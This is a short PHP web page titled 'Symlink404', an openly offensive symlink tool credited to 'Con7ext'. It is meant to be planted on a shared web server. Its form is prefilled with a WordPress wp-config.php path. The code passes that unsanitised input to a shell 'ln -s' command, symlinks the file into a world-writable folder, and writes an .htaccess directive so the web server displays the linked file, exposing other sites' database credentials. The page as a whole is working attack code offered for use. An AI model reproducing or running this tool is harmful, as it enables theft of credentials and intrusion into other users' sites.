<title>Symlink404</title>
<body bgcolor=black>
<center>
<font color="red">
<b><a href="https://www.facebook.com/rinto2234">Coded By Con7ext</a></b><br>
<form method="post"><br>File Target : <input name="dir" value="/home/user/public_html/wp-config.php">
<br>Save As: <input name="jnck" value="ojayakan.txt"><input name="ojaykan" type="submit" value="Eksekusi Gan"></form><br>
<?
@error_reporting(0);
@ini_set('display_errors', 0); 
if($_POST['ojaykan']){
rmdir("sym404");mkdir("sym404", 0777);
$dir = $_POST['dir'];
$jnck = $_POST['jnck'];
system("ln -s ".$dir." sym404/".$jnck);
symlink($dir,"sym404/".$jnck);
$inija = fopen("sym404/.htaccess", "w");
fwrite($inija,"ReadmeName ".$jnck);
echo'<a href="sym404/">Klik Gan >:(</a>';
}